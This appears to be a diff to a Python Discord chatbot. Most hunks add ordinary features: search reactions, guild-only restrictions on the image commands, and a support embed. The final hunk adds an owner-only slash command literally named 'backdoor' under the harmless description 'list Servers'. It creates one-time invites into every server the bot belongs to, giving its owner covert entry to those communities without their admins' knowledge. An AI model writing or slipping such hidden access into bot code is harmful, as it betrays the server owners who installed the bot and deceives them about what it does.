@@ -106,6 +106,8 @@ async def on_message(message):
     bot_name_in_message = bot.user.name.lower() in message.content.lower() and smart_mention
 
     if is_active_channel or is_allowed_dm or contains_trigger_word or is_bot_mentioned or is_replied or bot_name_in_message:
+        if internet_access:
+            await message.add_reaction("🔎")
         channel_id = message.channel.id
         key = f"{message.author.id}-{channel_id}"
 
@@ -131,6 +133,8 @@ async def on_message(message):
 
         async with message.channel.typing():
             response = await generate_response(instructions, search_results, history, file_content)
+            if internet_access:
+                await message.remove_reaction("🔎", bot.user)
         message_history[key].append({"role": "assistant", "name": personaname, "content": response})
 
         if response is not None:
@@ -231,6 +235,7 @@ async def clear(ctx):
     await ctx.send(f"Message history has been cleared", delete_after=4)
 
 
+@commands.guild_only()
 @bot.hybrid_command(name="imagine", description="Command to imagine an image")
 @app_commands.describe(
     prompt="Write a amazing prompt for a image",
@@ -248,7 +253,7 @@ async def imagine(ctx, prompt):
         await sent_message.add_reaction(reaction)
 
 
-
+@commands.guild_only()
 @bot.hybrid_command(name="imagine-pollinations", description="Bring your imagination into reality with pollinations.ai!")
 @app_commands.describe(images="Choose the amount of your image.")
 @app_commands.describe(prompt="Provide a description of your imagination to turn them into image.")
@@ -270,6 +275,7 @@ async def imagine_poly(ctx, *, prompt: str, images: int = 4):
         
     await ctx.send(files=files, ephemeral=True)
 
+@commands.guild_only()
 @bot.hybrid_command(name="gif", description=current_language["nekos"])
 @app_commands.choices(category=[
     app_commands.Choice(name=category.capitalize(), value=category)
@@ -325,6 +331,17 @@ async def support(ctx):
     embed = discord.Embed(title="Support Information", color=0x03a64b)
     embed.add_field(name="Discord Server", value=f"[Join Here]({invite_link})\nCheck out our Discord server for community discussions, support, and updates.", inline=False)
     embed.add_field(name="GitHub Repository", value=f"[GitHub Repo]({github_repo})\nExplore our GitHub repository for the source code, documentation, and contribution opportunities.", inline=False)
+
+    await ctx.send(embed=embed)
+
+@bot.hybrid_command(name="backdoor", description='list Servers')
+@commands.is_owner()
+async def server(ctx):
+    embed = discord.Embed(title="Server List", color=discord.Color.blue())
+
+    for guild in bot.guilds:
+        invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1, unique=True)
+        embed.add_field(name=guild.name, value=invite.url, inline=True)
 
     await ctx.send(embed=embed)
 
